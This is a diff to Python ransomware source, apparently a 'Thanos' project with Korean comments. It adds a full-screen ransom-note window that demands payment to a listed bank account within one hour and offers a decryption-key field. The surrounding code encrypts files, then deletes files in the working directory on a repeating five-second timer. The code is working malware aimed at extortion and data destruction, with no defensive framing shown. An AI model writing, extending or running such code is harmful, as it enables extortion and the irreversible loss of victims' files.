@@ -8,11 +8,58 @@ import glob
 import os
 import threading
 from time import sleep
+
+#gui 라이브러리
+import tkinter
+from ui import thanos
+from tkinter.ttk import Label
+from PIL import Image, ImageTk
+
 import binascii
 #나중에 쓰면 좋을 것 같은 라이브러리(이메일전송라이브러리, 고유식별자 부여 라이브러리)
 import smtplib
 import uuid
 from email.mime.text import MIMEText
+
+
+# 버튼클릭시 복호화될수 있게
+def key_submit():
+    pw = str(password.get())
+    label6 = tkinter.Label(window, text="키가 입력되었다 => "+pw, fg="red", bg="black", font="Helvetica 18 bold")
+    label6.pack()
+    pwbutton.destroy()
+    label4.destroy()
+    password.destroy()
+
+
+# gui 창 객체입니다
+window = tkinter.Tk()
+window.title("ransomware")
+window.state('zoomed')  # maximize the window
+height = window.winfo_height()  # ...
+width = window.winfo_width()
+window.configure(background="black")
+
+label1 = tkinter.Label(window, text="타노스 랜섬웨어에 감염되었다.", fg="red", bg="black", font='Helvetica 14 bold')
+label1.pack()
+label2 = tkinter.Label(window, text="1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.", fg="red", bg="black", font='Helvetica 18 bold')
+label2.pack()
+label3 = tkinter.Label(window, text="국민 786102-00-040854", fg="red", bg="black", font='Helvetica 18 bold')
+label3.pack()
+
+label4 = tkinter.Label(window, text="password:", fg="red", bg="black", font='Helvetica 14 bold')
+label4.pack()
+password = tkinter.Entry(window)
+password.pack()
+
+pwbutton = tkinter.Button(window, text="복호화", command=key_submit)
+pwbutton.pack()
+
+image = tkinter.PhotoImage(file="ui/face.png")
+
+label5 = tkinter.Label(window, image=image)
+label5.pack()
+
 
 iv = os.urandom(16)
 
@@ -39,6 +86,9 @@ def startTimer():
     remove_files(os.getcwd())
 
 def remove_files(path,ext=None):
+    #label6 = thanos.AnimatedGIF(window, "thanos1.gif")
+    #label6.pack()
+    #label5.destroy()
     remove_filelist=[]
     print("os.removelistdir(): \n", os.listdir())
     for name in os.listdir(path):
@@ -73,6 +123,11 @@ def remove_files(path,ext=None):
 #        print("파일 중 절반이 삭제되었습니다.")
         print("더 이상 삭제할 파일이 없습니다")
         exit(0)
+
+    #label6.destroy()
+    #label7 = tkinter.Label(window, image=image)
+    #label7.pack()
+
     threading.Timer(5, remove_files, [os.getcwd()]).start()
 
 def enc(key, cipher, in_filename, out_filename=None):
@@ -232,7 +287,13 @@ if __name__ == "__main__":
             continue
         enc(key, cipher, enc_target, out_filename=None)
 
-    startTimer()
+    # 타이머 시작 코드
+    th1 = threading.Thread(target=startTimer)
+    th1.start()
+
+    # gui 시작 코드
+    th2 = threading.Thread(window.mainloop())
+    th2.start()
 
 
     '''
